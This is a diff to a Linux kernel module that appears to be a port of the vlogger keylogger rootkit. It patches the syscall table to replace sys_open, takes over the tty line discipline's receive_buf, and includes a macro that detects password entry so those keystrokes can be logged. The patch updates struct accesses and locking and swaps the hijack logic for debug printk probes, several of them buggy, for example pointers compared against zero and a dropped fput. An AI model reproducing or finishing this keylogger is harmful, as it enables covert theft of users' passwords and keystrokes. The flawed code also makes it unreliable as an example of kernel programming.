@@ -27,9 +27,10 @@
 #include <linux/tty.h> // to use ttys
 #include <linux/tty_driver.h> // for tty constants
 #include <linux/file.h> // for file stuff like fget
+#include <linux/device.h>
 
 #include <linux/version.h>
-#include <linux/smp_lock.h>
+#include <linux/spinlock.h> // spin locks
 #include <linux/sched.h> // using the task struct
 #include <linux/string.h> // string stuff
 #include <asm/uaccess.h>
@@ -37,8 +38,9 @@
 #include <asm/io.h>
 
 /* Defines for debugging and logging modes */
-//#define DEBUG
+#define DEBUG
 //#define LOCAL_ONLY
+DEFINE_SPINLOCK(mr_lock);
 
 // these memory locations are specific to 32-bit systems
 #define START_MEM 0xc0000000
@@ -94,18 +96,19 @@ MODULE_LICENSE("GPL");
 // checks if echoing is disabled... I think
 #define IS_PASSWD(tty) L_ICANON(tty) && !L_ECHO(tty)
 // writes into a tty using a built in function
-#define TTY_WRITE(tty,buf,count) (*tty->driver.write)(tty, 0, buf, count)
+#define TTY_WRITE(tty,buf,count) (*tty->driver->write)(tty, 0, buf, count)
 // gets the tty name, which is either tyy or pts
-#define TTY_NAME(tty) (tty->driver.type == \
+#define TTY_NAME(tty) (tty->driver->type == \
     TTY_DRIVER_TYPE_CONSOLE ? N_TTY_NAME: \
-    tty->driver.type == TTY_DRIVER_TYPE_PTY && \
-		       tty->driver.subtype == PTY_TYPE_SLAVE ? N_PTS_NAME:"")
+    tty->driver->type == TTY_DRIVER_TYPE_PTY && \
+		       tty->driver->subtype == PTY_TYPE_SLAVE ? N_PTS_NAME:"")
 
 // the following macro expands the memory so that includes kernel memory.
 // we do this so that we can call system calls from within the kernel
 // otherwise the system call will fail
-#define BEGIN_KMEM { mm_segment_t old_fs = get_fs(); set_fs(get_ds());
-#define END_KMEM set_fs(old_fs); }
+mm_segment_t old_fs;
+#define BEGIN_KMEM {old_fs = get_fs(); set_fs(KERNEL_DS);}
+#define END_KMEM {set_fs(old_fs); }
 
 // for errors
 int errno;
@@ -127,7 +130,7 @@ struct tlogger *ttys[MAX_TTY_CON + MAX_PTS_CON] = {NULL};
 unsigned long *syscall_table;
 
 // pointer to the original receive_buf functino found in
-// tty->ldisc
+// tty->ldisc->ops
 void (*old_receive_buf)(struct tty_struct*, const unsigned char *,
 			char *, int);
 
@@ -144,55 +147,41 @@ int vlogger_mode = DEFAULT_MODE;
 
 // our replacement sys_open
 asmlinkage long new_open(const char *filename, int flags, int mode) {
-  int ret;
   // flag is set once we have the receive buf function
   static int fl = 0;
-  // everything in linux is a file, so we open our device as a file
-  struct file *file;
 
   // call the origina open function
-  ret = (*original_open)(filename, flags, mode);
+  long ret = (*original_open)(filename, flags, mode);
 	
-  if (ret >= 0) {
-    // we successfully opened the tty
-    struct tty_struct *tty;
-
-    // expand memory to kernel memory
-    BEGIN_KMEM
-
-      // lock the kernel
-      lock_kernel();
-
-    // open our tty and grab it. ttys are under file->private_data;
+  if (ret > 0) {
+    // we successfully opened this file
+    // get the file associated with fd
+    struct file* file;
+    spin_lock(&mr_lock);
     file = fget(ret);
+    spin_unlock(&mr_lock);
+
+    struct tty_struct* tty;
     tty = file->private_data;
 
-    // test the tty to make sure we opened it. We also want to
-    // make sure its the right type and that we haven't already chnged
-    // its receive_buf function pointer
-    if (tty != NULL && 
-	((tty->driver->type == TTY_DRIVER_TYPE_CONSOLE &&
-	  TTY_NUMBER(tty) < MAX_TTY_CON - 1 ) ||
-	 (tty->driver->type == TTY_DRIVER_TYPE_PTY &&
-	  tty->driver->subtype == PTY_TYPE_SLAVE &&
-	  TTY_NUMBER(tty) < MAX_PTS_CON)) &&
-	tty->ldisc->ops->receive_buf != NULL &&
-	tty->ldisc->ops->receive_buf != new_receive_buf) {
+    // check if this is a tty
+    if(tty != NULL && tty > 0){
+      printk(KERN_ALERT "this is a tty\n");
+      if(tty->ldisc != NULL && tty->ldisc > 0){
+	printk(KERN_ALERT "tty has ldisc\n");
+	if(tty->ldisc->ops != NULL && tty->ldisc->ops > 0){
+	  printk(KERN_ALERT "ldisc has ops\n");
+	}
+      }
 
-      // if we've already found it, we don't want to do it again
-      if (!fl) {
-	// grab the receive buf function pointer
-	old_receive_buf = tty->ldisc->ops->receive_buf;
-	fl = 1;
+      if(tty->dev != NULL && tty->dev > 0){
+	printk(KERN_ALERT "tty has device\n");
+	if(tty->dev->devt != NULL && tty->dev->devt > 0){
+	  //
+	}
       }
-      // initialize the tty so that we can log from it
-      //init_tty(tty, TTY_INDEX(tty));
     }
-    // finish up
-    fput(file);
-    unlock_kernel();
-    END_KMEM
-      }
+  }
   return ret;
 }
 
@@ -239,7 +228,7 @@ static int init(void) {
 }
 
 // this has to do with locking methinks
-DECLARE_WAIT_QUEUE_HEAD(wq);
+//DECLARE_WAIT_QUEUE_HEAD(wq);
 
 // exit function that gets called when the module
 // is unloaded. It resets the syscall table 
@@ -269,7 +258,7 @@ static void exit(void) {
     }
   }
   // probably has to do with kernel syncing
-  sleep_on_timeout(&wq, HZ);
+  //sleep_on_timeout(&wq, HZ);
   for (i=0; i<MAX_TTY_CON + MAX_PTS_CON; i++) {
     if (ttys[i] != NULL) {
       // free up every tlogger in our array
